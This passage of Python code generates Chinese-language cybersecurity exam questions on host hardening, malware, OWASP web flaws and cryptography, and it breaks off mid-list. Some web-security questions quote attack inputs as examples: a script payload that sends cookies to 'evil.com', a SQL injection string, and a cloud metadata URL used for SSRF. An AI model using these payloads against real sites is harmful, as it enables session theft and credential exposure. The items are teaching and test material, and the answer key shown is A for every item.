            opts_map = [
                ("A. Active Directory 群組原則物件（GPO, Group Policy Object）", "B. 撰寫批次檔由每位員工自行點擊執行", "C. 手動至每台電腦修改本機註冊表", "D. 透過電子郵件寄送使用手冊", "A",
                 "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
                 "手動或通知員工自行修改極易產生遺漏與合規死角。", "微軟 AD DS 架構指南"),
                ("A. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權", "B. 該檔案將自動加密無法執行", "C. 該檔案僅有 root 可以讀取", "D. 該檔案會自動刪除", "A",
                 "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
                 "應嚴格稽核系統中所有具 SUID 權限的非必要執行檔。", "Linux File System Security"),
                ("A. 啟用並保留預設的 Telnet 與 FTP 服務以利遠端快速連線維護", "B. 關閉無用連接埠並停用未使用的系統服務", "C. 修改預設管理員名稱並設置強密碼", "D. 移除系統中預設之範例檔案與測試資料庫", "A",
                 "Telnet 與 FTP 皆為純文字明文傳輸協定，帳號密碼極易在網路上被側錄，必須停用並改用 SSH 或 SFTP。",
                 "保留老舊明文服務是重大的主機強化缺失。", "CIS Benchmarks"),
                ("A. 先在與生產環境相似之測試環境進行驗證測試，確認無相容性問題後再按排程發布", "B. 不經任何測試，立即於上班尖峰時刻直接重啟伺服器並更新", "C. 忽視原廠修補程式，自行修改二進位執行檔", "D. 等待半年後下一次大改版再行考慮", "A",
                 "補丁上線標準流程：評估漏洞嚴重度 -> 測試環境驗證相容性 -> 備份現況 -> 排定維護窗口發布 -> 驗證修復結果。",
                 "直接未測即上生產環境極易造成全系統崩潰或關鍵服務不相容。", "NIST SP 800-40"),
                ("A. 於其離職生效當下立即停用（Disable）其帳號，並撤銷所有系統存取權限與回收實體設備", "B. 讓其繼續保留帳號 90 天以利接交", "C. 將其密碼變更為 123456 並轉交給其他同事繼續共用", "D. 僅移除電子郵件權限，保留 VPN 連線權限", "A",
                 "員工離職必須立即停用帳號，嚴禁保留存取權或共用帳號，以杜絕報復性破壞或未授權資料存取。",
                 "實務上先停用而非直接刪除，可保留歷史稽核軌跡並利於工作資料移轉。", "ISO/IEC 27001 A.6.5 離職控制"),
                ("A. 啟用 BitLocker 全磁碟加密（Full Disk Encryption）", "B. 僅在桌面資料夾設置密碼壓縮檔", "C. 設定 Windows 登入密碼", "D. 安裝傳統特徵碼防毒軟體", "A",
                 "BitLocker 全磁碟加密能將整個磁區加密，即便實體硬碟遭拔除接至其他電腦，沒有金鑰亦完全無法讀取任何明文資料。",
                 "單純設定 Windows 登入密碼無法防止離線拔出硬碟讀取資料。", "微軟安全架構"),
                ("A. 透過 GPO 集中設定「卸除式儲存裝置存取權」封鎖或限制為唯讀", "B. 貼上防拆貼紙要求員工自律", "C. 每日由警衛搜查員工背包", "D. 拔掉機殼電源線", "A",
                 "利用 GPO 集中禁用隨身碟讀寫或僅允許經資安審核白名單之加密 USB，是兼具效率與強制性的做法。",
                 "技術控制遠比行政自律更能有效防杜隨身碟外洩資料。", "NIST SP 800-111"),
                ("A. 啟用「稽核登入事件（Audit Logon Events）」的成功與失敗紀錄", "B. 關閉所有事件檢視器以節省磁碟空間", "C. 僅記錄檔案刪除事件", "D. 關閉防火牆日誌", "A",
                 "記錄登入成功與失敗事件，是分析暴力破解、密碼噴灑與橫向移動分析的最關鍵軌跡依據。",
                 "若未開啟失敗審核，將完全無法察覺異常密碼猜測行為。", "微軟安全稽核基準"),
                ("A. 禁用 root 直接密碼登入（PermitRootLogin prohibit-password），改採 SSH 公私鑰認證", "B. 將 SSH 連接埠改為 Port 80 並開放匿名存取", "C. 允許空密碼（PermitEmptyPasswords yes）以利快速連線", "D. 關閉主機防火牆以減少阻斷", "A",
                 "禁用 root 密碼直接登入並強制採用金鑰認證，能徹底阻絕針對 root 帳號的密碼暴力破解。",
                 "修改 Port 僅能略微降低雜訊，金鑰認證與禁用 root 才是根本安全措施。", "SSH 安全最佳實務"),
                ("A. Windows Defender Credential Guard（憑證保護）與 LSA Protection", "B. 關閉 Windows Defender 防毒", "C. 停用 UAC（使用者帳戶控制）", "D. 開放 Guest 訪客帳號", "A",
                 "Credential Guard 利用基於虛擬化的安全性（VBS）將金鑰隔離於受保護容器內，即使取得本機 Administrator 權限亦無法透過工具 Dump LSASS 記憶體密碼。",
                 "防範 Pass-the-Hash 與 Mimikatz 橫向移動的核心防禦利器。", "微軟 VBS 架構")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        elif domain_id == 4:
            # B-DOM-4: 惡意程式分析與常見威脅情境
            topics = [
                ("勒索軟體 (Ransomware) 感染防禦", "加密行為阻擋、離線備份與橫向擴散防護"),
                ("特洛伊木馬 (Trojan) 與後門機制", "偽裝合法程式、開機自動啟動與 C2 遠端通訊"),
                ("電腦蠕蟲 (Worm) 內網自主擴散", "利用 SMB/RPC 漏洞自主掃描傳播 (如 WannaCry)"),
                ("殭屍網路 (Botnet) 與 DDoS 幫凶", "C&C 伺服器集中指揮與受控肉雞利用"),
                ("隱匿惡意程式 (Rootkit) 原理", "內核層 Hooking、隱藏進程、檔案與連線"),
                ("無檔案惡意程式 (Fileless Malware)", "注入合法進程 (LOLBins)、記憶體執行與註冊表潛伏"),
                ("魚叉式網路釣魚 (Spear Phishing)", "針對特定業務人員之客製化欺詐信件"),
                ("水坑攻擊 (Watering Hole) 威脅", "攻陷目標群體常訪網站伺機植入 Exploit"),
                ("巨集病毒 (Macro Virus) 防護", "Office 預設停用來自網際網路的未簽名巨集"),
                ("惡意廣告 (Malvertising) 與掛馬", "合法廣告聯播網遭注入惡意重定向與漏洞攻擊")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
                    f"{org}一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
                    f"{org}內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
                    f"{org}監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
                    f"{org}資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
                    f"{org}資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
                    f"{org}人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
                    f"{org}資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
                    f"{org}為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
                    f"{org}資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為："
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "勒索軟體（Ransomware）最主要藉由下列何種密碼學機制來封鎖受害者電腦上的檔案？",
                    "特洛伊木馬（Trojan Horse）惡意程式與電腦蠕蟲（Worm）最主要之本質差異為何？",
                    "具備自我複製、不需要依附宿主程式、且能透過網路主動掃描脆弱主機並自動傳播的惡意程式稱為：",
                    "由大量受惡意程式感染並聽從攻擊者指令控制伺服器（C2 Server）指揮的受害電腦所組成之網路稱為：",
                    "旨在取得作業系統最高權限（Kernel-level）並刻意隱蔽自身進程、網路通訊埠與註冊表痕跡之惡意工具稱為：",
                    "「無檔案惡意程式（Fileless Malware）」通常利用何種方式在受害主機上執行並達成隱匿？",
                    "針對特定企業或組織之特定關鍵人員（如財務主管、高階主管）進行深度社交工程設計的網路釣魚郵件稱為：",
                    "攻擊者預先分析目標受害者喜好，入侵受害者經常造訪之合法第三方網站並埋設漏洞利用程式的攻擊手法稱為：",
                    "關於防禦電子郵件中的惡意巨集（Macro），下列何者為最安全的預設組態？",
                    "利用合法的網路廣告投放管道散播惡意軟體或漏洞利用程式之攻擊手法稱為："
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離", "B. 立即重新啟動電腦嘗試修復", "C. 立即點擊勒索信中的比特幣連結付款", "D. 立即將備份硬碟插上受害電腦進行還原", "A",
                 "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
                 "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！", "NIST SP 800-61 事件應變指南"),
                ("A. 特洛伊木馬（Trojan Horse）", "B. 電腦蠕蟲（Worm）", "C. 邏輯炸彈（Logic Bomb）", "D. 網站漏洞（SQL Injection）", "A",
                 "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
                 "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。", "MITRE ATT&CK T1204"),
                ("A. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力", "B. 巨集病毒必須由使用者手動開啟檔案", "C. 跨網站腳本必須由瀏覽器觸發", "D. 勒索軟體必須由黑客人工手動逐台輸入密碼", "A",
                 "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
                 "能在短時間內無感感染整片網段者通常為蠕蟲行為。", "CERT 資安威脅分類手冊"),
                ("A. 殭屍節點（Botnet / Bots）", "B. 蜜罐（Honeypot）", "C. 負載平衡器（Load Balancer）", "D. 代理伺服器（Proxy）", "A",
                 "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
                 "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。", "OWASP IoT Top 10"),
                ("A. Rootkit（管理者工具包 / 隱匿工具）", "B. 鍵盤側錄器（Keylogger）", "C. 勒索軟體（Ransomware）", "D. 廣告軟體（Adware）", "A",
                 "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
                 "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。", "MITRE ATT&CK T1014"),
                ("A. 無檔案惡意程式（Fileless Malware）", "B. 傳統開機區引導病毒", "C. 磁碟壞軌故障", "D. 網路釣魚攻擊", "A",
                 "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
                 "防範此威脅必須仰賴端點 EDR 之動態行為監控。", "MITRE ATT&CK Living Off The Land"),
                ("A. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕", "B. 立即點擊啟用巨集以確認真實姓名", "C. 將檔案轉寄給全公司同仁幫忙確認", "D. 忽略警告直接填寫個人資料", "A",
                 "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
                 "企業應預設禁用來自網路之 Office 巨集。", "CISA 惡意巨集防護指南"),
                ("A. 水坑攻擊（Watering Hole Attack）", "B. 阻斷服務攻擊（DDoS）", "C. 字典檔暴力破解攻擊", "D. 實體尾隨入侵", "A",
                 "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
                 "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。", "MITRE ATT&CK T1189"),
                ("A. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）", "B. 開放所有巨集無需提醒", "C. 僅要求同仁自行辨識信箱來源", "D. 停用 Windows Update", "A",
                 "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
                 "行政宣導效果有限，必須從作業系統原則予以強制禁用。", "微軟 Office 安全組態指南"),
                ("A. 惡意廣告攻擊（Malvertising）", "B. 中間人攻擊（MitM）", "C. 網路釣魚（Phishing）", "D. 社交工程（Social Engineering）", "A",
                 "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
                 "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。", "ENISA 威脅情勢報告")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        elif domain_id == 5:
            # B-DOM-5: 應用系統安全與 OWASP Top 10
            topics = [
                ("SQL Injection (SQLi) 原理與根治", "參數化查詢 (Parameterized Queries) 與 Prepared Statements"),
                ("跨網站腳本 (XSS) 攻擊防護", "儲存型 vs 反射型、輸出編碼 (Output Encoding) 與 HttpOnly"),
                ("權限控制失效 (Broken Access Control)", "水平越權 IDOR 與伺服器端鑑權校驗"),
                ("密碼學失效 (Cryptographic Failures)", "敏感資料明文傳輸/存儲與強演算法替換"),
                ("跨網站請求偽造 (CSRF) 防禦", "CSRF Token 與 SameSite Cookie 屬性"),
                ("伺服器端請求偽造 (SSRF) 威脅", "嚴格 URL 白名單與禁止訪問內網 IP/中繼資料"),
                ("安全性設定錯誤 (Security Misconfiguration)", "預設密碼、開啟 Debug 模式與過度詳細之報錯資訊"),
                ("不安全的反序列化 (Insecure Deserialization)", "不受信任資料還原為物件導致遠端代碼執行"),
                ("軟體與資料完整性失效", "CI/CD 供應鏈污染與未驗證的自動更新機制"),
                ("安全性日誌與監控失效", "關鍵操作無稽核軌跡或錯誤記錄明文密碼")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
                    f"{org}的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
                    f"{org}的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
                    f"{org}委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
                    f"{org}網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
                    f"{org}的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
                    f"{org}上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
                    f"{org}資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
                    f"{org}的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
                    f"{org}在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為："
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "防範 SQL 注入攻擊（SQL Injection）最標準、最推薦之根本解決方案為何？",
                    "關於跨網站腳本攻擊（XSS, Cross-Site Scripting），下列何種防禦措施能有效阻止 JavaScript 腳本讀取敏感的 Session Cookie？",
                    "攻擊者透過竄改請求參數中之物件識別碼（如 userID, docID），存取其未被授權閱覽之其他使用者資料，此在 OWASP Top 10 中稱為：",
                    "在密碼學應用中，為了防範彩虹表（Rainbow Table）離線查表逆向破解使用者密碼，對密碼進行雜湊運算時必須加入何種機制？",
                    "關於防禦跨網站請求偽造（CSRF, Cross-Site Request Forgery），下列何者「非」有效防範措施？",
                    "伺服器端請求偽造（SSRF, Server-Side Request Forgery）攻擊之核心威脅在於：",
                    "依據 OWASP Top 10 規範，下列何者屬於典型的「安全性設定錯誤（Security Misconfiguration）」？",
                    "在 HTTP 回應標頭中加入 `Content-Security-Policy (CSP)`，主要能夠有效緩解下列何種前端資安風險？",
                    "防範任意檔案上傳（Unrestricted File Upload）漏洞的最佳實務，不包括下列何者？",
                    "當應用程式未對不可信來源的序列化資料進行安全校驗即直接進行還原（Deserialization），最嚴重的潛在危害為："
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）", "B. 僅在前端 JavaScript 阻擋單引號輸入", "C. 將資料庫管理員帳號改為 root", "D. 加大資料庫伺服器記憶體", "A",
                 "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
                 "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。", "OWASP Top 10 A03 注入防護"),
                ("A. 儲存型跨網站腳本（Stored XSS）", "B. 反射型跨網站腳本（Reflected XSS）", "C. DOM 型跨網站腳本（DOM-based XSS）", "D. SQL 注入攻擊（SQLi）", "A",
                 "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
                 "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。", "OWASP Top 10 A03 注入與 XSS"),
                ("A. 權限控制失效（Broken Access Control / IDOR）", "B. 阻斷服務攻擊（DDoS）", "C. 緩衝區溢位（Buffer Overflow）", "D. 密碼學失效（Cryptographic Failure）", "A",
                 "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
                 "現為 OWASP Top 10 排名第一之重大弱點類別。", "OWASP Top 10 A01 Broken Access Control"),
                ("A. 密碼學失效（Cryptographic Failures）", "B. 安全性設定錯誤", "C. 注入攻擊", "D. 軟體及資料完整性失效", "A",
                 "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
                 "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。", "OWASP Top 10 A02 Cryptographic Failures"),
                ("A. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性", "B. 取消所有使用者的登入功能", "C. 僅依賴 HTTP Referer 檢查", "D. 採用更長的使用者密碼", "A",
                 "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
                 "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。", "OWASP CSRF 防禦指引"),
                ("A. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）", "B. 本地檔案包含（LFI）", "C. 跨網站腳本（XSS）", "D. 中間人攻擊（MitM）", "A",
                 "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
                 "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。", "OWASP Top 10 A10 SSRF"),
                ("A. 安全性設定錯誤（Security Misconfiguration）", "B. 注入漏洞", "C. 身分識別及驗證失敗", "D. 軟體供應鏈弱點", "A",
                 "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
                 "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。", "OWASP Top 10 A05 Security Misconfiguration"),
                ("A. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID", "B. 伺服器將無法解析 Cookie", "C. 瀏覽器將無法關閉", "D. 資料庫會被自動清空", "A",
                 "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
                 "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。", "RFC 6265"),
                ("A. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）", "B. 跨網站請求偽造（CSRF）", "C. SQL 注入攻擊", "D. 阻斷服務攻擊", "A",
                 "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
                 "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。", "OWASP 檔案上傳安全指南"),
                ("A. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）", "B. 緩衝區溢位", "C. 密碼過期", "D. 網路斷線", "A",
                 "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
                 "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。", "OWASP Top 10 A08 軟體與資料完整性失效")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        elif domain_id == 6:
            # B-DOM-6: 密碼學基礎、金鑰管理與身分認證
            topics = [
                ("對稱式加密演算法 (AES, 3DES, DES)", "運算效能、金鑰長度 128/256 與分組模式 (CBC vs GCM)"),
                ("非對稱式加密演算法 (RSA, ECC)", "公鑰加密/私鑰解密與金鑰交換 (Key Exchange)"),
                ("密碼學安全雜湊函數 (SHA-256, SHA-3)", "單向性、雪崩效應與防範雜湊碰撞"),
                ("數位簽章 (Digital Signature) 運作", "私鑰簽署/公鑰驗證、達成真實性與不可否認"),
                ("公開金鑰基礎建設 (PKI) 與憑證管理", "X.509 憑證架構、CA 簽發與信任鏈"),
                ("憑證撤銷機制 (CRL vs OCSP)", "定期黑名單發布 vs 即時線上查詢狀態 (OCSP Stapling)"),
                ("多因素驗證 (MFA) 原則與型態", "Something you know/have/are 與防釣魚 FIDO2"),
                ("密碼存儲安全最佳實務", "加鹽 (Salt)、緩慢雜湊 (Argon2, bcrypt) 與密碼複雜度"),
                ("傳輸層金鑰交換 (Diffie-Hellman / PFS)", "暫態 DH (DHE/ECDHE) 提供前向保密性"),
                ("金鑰生命週期管理", "金鑰生成、分發、輪替 (Rotation)、備份與銷毀")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
                    f"{org}規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
                    f"{org}軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
                    f"{org}為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
                    f"{org}內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
                    f"{org}為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
                    f"{org}在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
                    f"{org}資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
                    f"{org}內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
                    f"{org}為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？"
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "關於對稱式加密演算法（Symmetric Encryption）與非對稱式加密演算法之比較，下列敘述何者正確？",
                    "在非對稱加密（如 RSA）中，若甲欲傳送一份機密文件給乙，且僅允許乙能解密閱讀，甲應使用何者進行加密？",
                    "密碼學雜湊函數（Cryptographic Hash Function）之「雪崩效應（Avalanche Effect）」係指何種現象？",
                    "數位簽章（Digital Signature）之生成與驗證流程中，簽署者產生簽章所使用的金鑰為：",
                    "在 PKI X.509 憑證撤銷查驗中，相較於傳統定期下載的憑證撤銷清冊（CRL），「線上憑證狀態協定（OCSP）」具備何種優勢？",
                    "多因素驗證（MFA）要求跨越不同類別之驗證維度。下列何者屬於「所具（Something you are）」的驗證因子？",
                    "防範彩虹表（Rainbow Table）逆向比對破解密碼雜湊的最有效方法為：",
                    "在 TLS 加密交握中，採用何種金鑰交換演算法能確保即使伺服器私鑰日後遭到洩漏，過去已側錄攔截之歷史加密通訊流量依然無法被回溯解密？",
                    "關於密碼學金鑰長度與安全性，依據目前 NIST 標準，RSA 非對稱演算法建議之最低安全金鑰長度為：",
                    "現代對稱區塊加密演算法（如 AES）在進行資料加密時，若希望同時提供「資料機密性」與「訊息完整性鑑別（AEAD）」，應採用何種運作模式？"
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. AES-256（進階加密標準，具極高運算效能與強安全性）", "B. RSA-4096（非對稱演算法）", "C. MD5（單向雜湊演算法）", "D. Caesar 凱薩密碼", "A",
                 "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
                 "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。", "NIST SP 800-175B"),
                ("A. 伺服器的公鑰（Server's Public Key）", "B. 伺服器的私鑰（Server's Private Key）", "C. 客戶端自己的公鑰", "D. 客戶端自己的私鑰", "A",
                 "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
                 "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。", "PKI 基礎原理"),
                ("A. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀", "B. 資料機密性（Confidentiality）加密", "C. 交易不可否認性", "D. 伺服器身分鑑別", "A",
                 "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
                 "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。", "NIST FIPS 180-4"),
                ("A. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）", "B. 對稱式 AES-128 加密", "C. 建立 VPN 虛擬私人通道", "D. 設定高強度資料庫密碼", "A",
                 "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
                 "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。", "《電子簽章法》第9條"),
                ("A. OCSP（線上憑證狀態協定）", "B. DNS 解析協定", "C. SMTP 郵件傳輸協定", "D. Telnet 協定", "A",
                 "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
                 "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。", "RFC 6960"),
                ("A. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）", "B. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）", "C. 員工工號 ＋ 身份證字號（兩者皆為所知）", "D. 英文密碼 ＋ 數字密碼（兩者皆為所知）", "A",
                 "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
                 "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。", "NIST SP 800-63B"),
